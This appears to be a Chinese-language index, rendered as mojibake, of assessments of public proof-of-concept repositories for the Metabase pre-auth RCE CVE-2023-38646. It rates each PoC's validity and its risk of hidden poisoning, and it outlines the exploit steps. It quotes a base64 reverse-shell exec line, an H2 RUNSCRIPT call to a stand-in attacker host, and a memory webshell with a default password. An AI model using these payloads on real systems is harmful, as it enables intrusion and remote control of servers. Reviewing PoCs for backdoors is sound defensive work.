PoCä»£ç æœ¬èº«çš„åå¼¹shellè¿æ¥åœ°å€æ˜¯å¯ä»¥é…ç½®çš„, å¦‚æœä½œè€…æƒ³æŠ•æ¯’,å¯ä»¥å°†IPåœ°å€å†™æ­»,æˆ–è€…åŠ å…¥å…¶ä»–æ¶æ„æ“ä½œ.
*   æ¼æ´åˆ©ç”¨ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå…¶ç›®çš„æ˜¯æ˜ç¡®çš„ã€‚
*   `README.md` æ–‡ä»¶åªåŒ…å« PoC çš„åŸºæœ¬ä¿¡æ¯ã€‚

å› æ­¤ï¼Œè¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½, å¤§æ¦‚åœ¨10%å·¦å³ã€‚æŠ•æ¯’çš„ä¸»è¦é£é™©åœ¨äºæ¶æ„ä¿®æ”¹payloadï¼Œä¾‹å¦‚åå¼¹shellåœ°å€æˆ–è€…æ’å…¥å…¶ä»–çš„æ¶æ„æ“ä½œã€‚

**é¡¹ç›®åœ°å€:** [Zenmovie/CVE-2023-38646](https://github.com/Zenmovie/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #16

**æ¥æº**: [CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md](../2023/CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md)

# CVE-2023-38646

> ğŸ“¦ è¯¥CVEæœ‰ **27** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md](../2023/CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md)

## CVE-2023-38646 - Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯å…¬å¼€è®¿é—®æˆ–æ”»å‡»è€…ä½äºåŒä¸€ç½‘ç»œ

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè·å¾—æœåŠ¡å™¨æƒé™ã€‚æ¼æ´å­˜åœ¨äº Metabase 0.46.6.1 ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ 1.46.6.1 ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æ ¹æ®æœç´¢ç»“æœï¼Œå·²ç»æœ‰å…¬å¼€çš„ PoC ä»£ç å¯ç”¨ (ä¾‹å¦‚ï¼Œgithub.com/threatHNTR/CVE-2023-38646)ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åŸºäº Assetnote çš„ä¸€ç¯‡å…³äºè¯¥æ¼æ´åˆ†æçš„æ–‡ç« ã€‚å®ƒé€šè¿‡åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥é…ç½®ä¸­æ‰§è¡Œæ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒé€šè¿‡æ„é€ ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥ URLï¼Œåœ¨è¿æ¥æ•°æ®åº“æ—¶è§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š

1.  **æ„é€ æ¶æ„ JSON Payload:**  è¯¥ JSON payload ç”¨äºåˆ›å»ºæˆ–ä¿®æ”¹ Metabase ä¸­çš„æ•°æ®åº“è¿æ¥ã€‚ å…¶ä¸­ `classname` è¢«è®¾ç½®ä¸º `org.h2.Driver` , `subname` åŒ…å«æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²,å­—ç¬¦ä¸²åˆ©ç”¨ H2 çš„ `CREATE TRIGGER` ç‰¹æ€§ï¼Œåœ¨INFORMATION_SCHEMA.TABLESä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨, è¯¥è§¦å‘å™¨ä¼šåœ¨æ¯æ¬¡æŸ¥è¯¢è¯¥è¡¨æ—¶æ‰§è¡ŒåµŒå…¥çš„ JavaScript ä»£ç , JavaScriptä»£ç è´Ÿè´£æ‰§è¡Œå‘½ä»¤.
2.  **å‘é€Payload:** é€šè¿‡å‘é€ POST è¯·æ±‚åˆ° Metabase API ç«¯ç‚¹ï¼ˆé€šå¸¸æ˜¯ /api/setup/validate æˆ–å…¶ä»–ç›¸å…³ç«¯ç‚¹ï¼‰ï¼Œå°†æ„é€ çš„ JSON payload å‘é€ç»™ Metabase æœåŠ¡å™¨ã€‚ç”±äºè¯¥æ¼æ´æ˜¯æœªç»èº«ä»½éªŒè¯çš„ï¼Œå› æ­¤æ— éœ€æä¾›ä»»ä½•èº«ä»½éªŒè¯ä¿¡æ¯ã€‚
3.  **è§¦å‘ RCE:** Metabase æœåŠ¡å™¨å°è¯•ä½¿ç”¨æä¾›çš„é…ç½®è¿æ¥åˆ° H2 æ•°æ®åº“æ—¶ï¼Œæ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ä¼šè¢«è§£æå’Œæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ PoC çš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨è¯¥æ¼æ´ã€‚ åˆ†æä»£ç ï¼Œå‘ç°é«˜é£é™©çš„è¡Œä¸ºæ˜¯æ‰§è¡Œ `java.lang.Runtime.getRuntime().exec('bash -c {echo,BASE64COMMAND}|{base64,-d}|{bash,-i}')`ã€‚è¿™è¡Œä»£ç å…è®¸æ‰§è¡Œä»»æ„çš„ bash å‘½ä»¤ã€‚æŠ•æ¯’é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **å‘½ä»¤æ³¨å…¥é£é™©ï¼š**  è™½ç„¶ä»£ç ä¸­ä½¿ç”¨äº† Base64 ç¼–ç ï¼Œä½†æ”»å‡»è€…ä»ç„¶å¯èƒ½é€šè¿‡ä¿®æ”¹ Base64 ç¼–ç çš„å†…å®¹æ¥æ³¨å…¥æ¶æ„å‘½ä»¤ã€‚
*   **æƒé™æå‡é£é™©ï¼š**  ç”±äºä»£ç ä»¥ Metabase æœåŠ¡å™¨çš„æƒé™è¿è¡Œï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´æå‡æƒé™ã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ä¸»è¦æ¥è‡ªäºå‘½ä»¤æ³¨å…¥çš„å¯èƒ½æ€§ï¼Œä½†è¿™å–å†³äºå¦‚ä½•ä½¿ç”¨å’Œä¿®æ”¹ PoCã€‚æ•´ä½“æŠ•æ¯’å¯èƒ½æ€§è¾ƒä½ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦1%ã€‚å› ä¸ºä½œè€…å·²ç»è¯´æ˜äº†è¿™æ˜¯ä¸€ä¸ªæ¼æ´çš„æ‰©å±•ï¼Œæ„åœ¨è§£å†³ä¸€äº›ç‰¹å®šæƒ…å†µä¸‹çš„åˆ©ç”¨é—®é¢˜ï¼Œå¹¶ä¸”ä¸»è¦ä»£ç é€»è¾‘æ˜¯åˆ©ç”¨å·²çŸ¥æ¼æ´ï¼Œè€Œä¸æ˜¯å¼•å…¥æ–°çš„ã€éšè”½çš„æ¶æ„ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [0utl4nder/Another-Metabase-RCE-CVE-2023-38646](https://github.com/0utl4nder/Another-Metabase-RCE-CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #2

**æ¥æº**: [CVE-2023-38646-AnvithLobo_CVE-2023-38646.md](../2023/CVE-2023-38646-AnvithLobo_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯é€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨å»ºç«‹æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œé¢„å…ˆè®¾å®šçš„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **è·å–Tokenï¼š** é¦–å…ˆï¼Œé€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å–ä¸€ä¸ªsetup tokenã€‚
2.  **æ„é€ Payloadï¼š**  ç„¶åï¼Œæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åˆ©ç”¨`CREATE TRIGGER`è¯­å¥åˆ›å»ºè§¦å‘å™¨ï¼Œåœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œå‰è§¦å‘ã€‚è§¦å‘å™¨æ‰§è¡Œçš„JavaScriptä»£ç ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
3.  **Base64ç¼–ç ï¼š** ä½¿ç”¨Base64å¯¹åå‘shellæŒ‡ä»¤è¿›è¡Œç¼–ç ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦å½±å“ã€‚
4.  **å‘é€Payloadï¼š**  æœ€åï¼Œå°†æ„é€ å¥½çš„JSON payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚

**æœ‰æ•ˆæ€§ï¼š**  æä¾›çš„PoCä»£ç æœ‰æ•ˆï¼Œå¯ä»¥æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©ï¼š**  ä»£ç ä¸­æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è„šæœ¬çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å¹¶æ‰§è¡Œåå‘shellã€‚ä½œè€…æä¾›çš„ä»£ç é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ¶æ„ä»£ç ç‰‡æ®µæˆ–è€…éšè—çš„åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½ä¸æè¿°ä¸€è‡´ï¼Œç›®çš„æ˜¯åˆ©ç”¨Metabaseçš„æ¼æ´æ¥è·å–è¿œç¨‹ä»£ç æ‰§è¡Œæƒé™ã€‚å› æ­¤, æŠ•æ¯’é£é™©è¯„ä¼°ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [AnvithLobo/CVE-2023-38646](https://github.com/AnvithLobo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #3

**æ¥æº**: [CVE-2023-38646-Boogipop_MetabaseRceTools.md](../2023/CVE-2023-38646-Boogipop_MetabaseRceTools.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1, Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™çº§åˆ«ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼åˆ†æå¦‚ä¸‹ï¼š

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æœªæˆæƒè®¿é—®ï¼š** è¯¥æ¼æ´æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ã€‚
2.  **RCEï¼š**  æ”»å‡»è€…å¯ä»¥å‘é€ç‰¹åˆ¶çš„è¯·æ±‚ï¼Œæ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„ä»»æ„å‘½ä»¤ã€‚
3.  **å…·ä½“åˆ©ç”¨ï¼š** æ ¹æ®æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ”»å‡»æµç¨‹ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š
    *   **éªŒè¯æ¨¡å—ï¼š**  å‘`/api/session/properties`ç«¯ç‚¹å‘é€è¯·æ±‚ï¼Œè·å–æœªæˆæƒçš„tokenï¼Œç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚
    *   **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** åˆ©ç”¨ä¸Šä¸€æ­¥è·å–çš„tokenï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚éœ€è¦æŒ‡å®šmetabase.jarçš„ä½ç½®ã€‚
    *   **å†…å­˜é©¬æ³¨å…¥æ¨¡å—ï¼š** é€šè¿‡ä¿®æ”¹`x-client-data`è¯·æ±‚å¤´æ³¨å…¥å†…å­˜é©¬ï¼Œæ”¯æŒ cmd å’Œ godzilla ä¸¤ç§æ¨¡å¼ã€‚cmdæ¨¡å¼ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œgodzillaæ¨¡å¼åˆ™ç›´æ¥è¿æ¥å“¥æ–¯æ‹‰webshellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ª Metabase RCE å›¾å½¢åŒ–åˆ©ç”¨å·¥å…·ï¼ŒåŒ…å«äº†éªŒè¯æ¨¡å—ã€å‘½ä»¤æ‰§è¡Œæ¨¡å—å’Œå†…å­˜é©¬æ³¨å…¥æ¨¡å—ã€‚ä¸»è¦çš„æ½œåœ¨æŠ•æ¯’é£é™©å­˜åœ¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **å†…å­˜é©¬æ³¨å…¥ï¼š** å†…å­˜é©¬æ³¨å…¥æ¨¡å—æœ¬èº«å…·æœ‰è¾ƒé«˜çš„é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºæ¤å…¥æ¶æ„ä»£ç ï¼Œé•¿æœŸæ§åˆ¶æœåŠ¡å™¨ã€‚ä»£ç ä¸­`x-client-data:godzilla`çš„æ–¹å¼è¿æ¥å“¥æ–¯æ‹‰webshellï¼Œé»˜è®¤å¯†ç ä¸ºpassï¼Œå¯èƒ½ä¼šè¢«å…¶ä»–äººåˆ©ç”¨ã€‚
2.  **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** è™½ç„¶å‘½ä»¤æ‰§è¡Œæ¨¡å—çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹è¯¥æ¨¡å—ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚ä¸‹è½½å¹¶æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚

è€ƒè™‘åˆ°ä»¥ä¸Šé£é™©ï¼Œè¯¥POCå·¥å…·å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå°¤å…¶æ˜¯å†…å­˜é©¬æ¨¡å—ã€‚éœ€è¦åœ¨ä½¿ç”¨å‰è¿›è¡Œä»£ç å®¡è®¡ï¼Œç¡®ä¿æ²¡æœ‰æ¶æ„ä»£ç ã€‚

**é£é™©è¯„ä¼°ï¼š**

å°½ç®¡è¯¥å·¥å…·ç®€åŒ–äº†æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œä½†ä½¿ç”¨å®ƒä¹Ÿå¯èƒ½å¼•å…¥é£é™©ã€‚ç”¨æˆ·åº”è°¨æ…ä½¿ç”¨æ­¤å·¥å…·ï¼Œå¹¶å……åˆ†äº†è§£å…¶æ½œåœ¨çš„å±å®³ã€‚å»ºè®®åœ¨éç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå¹¶è¿›è¡Œå……åˆ†çš„å®‰å…¨æµ‹è¯•ã€‚

**é£é™©æ¦‚ç‡ï¼š**

è€ƒè™‘åˆ°å†…å­˜é©¬æ³¨å…¥çš„é£é™©ï¼Œä¸”è¯¥POCå·¥å…·ç”±ä¸ªäººå¼€å‘è€…æä¾›ï¼Œå¹¶éæ¥è‡ªå®˜æ–¹æˆ–ä¿¡èª‰è‰¯å¥½çš„å®‰å…¨å‚å•†ï¼Œå› æ­¤ç»¼åˆè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªäºå¯¹ä½¿ç”¨è€…ç¼ºä¹å®‰å…¨æ„è¯†ä»¥åŠå¯¹å·¥å…·çš„æœªçŸ¥æ€§å¯èƒ½å¸¦æ¥çš„é£é™©ï¼Œè€Œéä»£ç æœ¬èº«ä¸€å®šå­˜åœ¨æ¶æ„åé—¨ã€‚

**é¡¹ç›®åœ°å€:** [Boogipop/MetabaseRceTools](https://github.com/Boogipop/MetabaseRceTools)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #4

**æ¥æº**: [CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md](../2023/CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ä»¥é€šè¿‡HTTPè®¿é—®ï¼Œä¸”æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´åˆ©ç”¨äº† Metabase å¤„ç†æ•°æ®åº“è¿æ¥çš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯ H2 æ•°æ®åº“ã€‚æä¾›çš„ POC è„šæœ¬é¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ï¼Œæœ€åæ·»åŠ ä¸€ä¸ªæ¶æ„çš„æ•°æ®åº“è¿æ¥ï¼Œè¯¥è¿æ¥åŒ…å«ä¸€ä¸ª H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥å¼å‘½ä»¤ï¼Œå…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚è¿æ¥å­—ç¬¦ä¸²ä¸­çš„ `INIT=RUNSCRIPT FROM 'http://attacker-server.com/poc.sql'` æŒ‡ç¤º H2 ä»è¿œç¨‹æœåŠ¡å™¨æ‰§è¡Œ SQL è„šæœ¬ï¼Œè™½ç„¶ `poc.sql` æ–‡ä»¶æœ¬èº«æ— å®³ï¼Œä½†çœŸæ­£çš„æ”»å‡»è½½è·åµŒå…¥åœ¨è¿æ¥å­—ç¬¦ä¸²æœ¬èº«ï¼Œåˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºä¸€ä¸ªJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**åˆ©ç”¨æ–¹å¼ï¼š**\n1. **è·å– Setup Token:**  é€šè¿‡è®¿é—® `/api/session/properties` è·å–åˆå§‹è®¾ç½®æ‰€éœ€çš„ tokenã€‚\n2. **è®¾ç½®ç®¡ç†å‘˜è´¦æˆ·:**  ä½¿ç”¨è·å–çš„ tokenï¼Œè°ƒç”¨ `/api/setup` åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦æˆ·ã€‚è¿™å°†åˆ›å»ºä¸€ä¸ªå…·æœ‰å¿…è¦æƒé™çš„ä¼šè¯ã€‚\n3. **æ·»åŠ æ¶æ„æ•°æ®åº“è¿æ¥:** ä½¿ç”¨æ–°åˆ›å»ºçš„ç®¡ç†å‘˜ä¼šè¯ï¼Œè°ƒç”¨ `/api/database` API æ·»åŠ ä¸€ä¸ªæ–°çš„æ•°æ®åº“ã€‚å…³é”®åœ¨äºæ„é€ æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨ `INIT` å‚æ•°æ‰§è¡Œè¿œç¨‹ SQL è„šæœ¬ï¼Œè¯¥è„šæœ¬å®šä¹‰äº†ä¸€ä¸ª Java å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸ºäº†ç»•è¿‡æŸäº›é™åˆ¶ï¼Œé€šå¸¸åˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ PoC ä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå®ƒèƒ½å¤Ÿåˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase å®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œå¦‚æœç›®æ ‡å®ä¾‹çš„ç‰ˆæœ¬ä½äºå—å½±å“çš„ç‰ˆæœ¬ã€‚\n\n**æŠ•æ¯’é£é™©ï¼š** é£é™©ä¸º10%ï¼Œä¸»è¦é£é™©åœ¨äº `exploit.py` æ–‡ä»¶ä¸­`YOUR_GITPOD_WORKSPACE_URL` å¦‚æœä¸æ˜¯æ”»å‡»è€…è‡ªå·±çš„æœåŠ¡å™¨ï¼Œå­˜åœ¨è¢«ä¸­é—´äººæ”»å‡»æ›¿æ¢è¿æ¥çš„é£é™©. è™½ç„¶`poc.sql`ç›®å‰ä»…ä»…æ˜¯ `SELECT 1;`ï¼Œ ä½†æ˜¯å¦‚æœæœ‰äººæ¶æ„ä¿®æ”¹`poc.sql`ï¼Œåˆ™å­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚ start.shä¸­çš„metabase.jaræ¥æºå¯èƒ½è¢«ç¯¡æ”¹ï¼Œå­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [BreezeGalaxy/CVE-2023-38646](https://github.com/BreezeGalaxy/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #5

**æ¥æº**: [CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md](../2023/CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡éœ€è¦å¯è®¿é—®ï¼Œæ— éœ€è®¤è¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„JDBC URLæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š
1.  è·å–setup-tokenï¼šPOCé¦–å…ˆå°è¯•ä»`/api/session/properties`è·å–setup-tokenã€‚è¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚ä»æ¼æ´ä¿¡æ¯æ¥çœ‹ï¼Œè¿™ä¸ªæ¥å£ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚
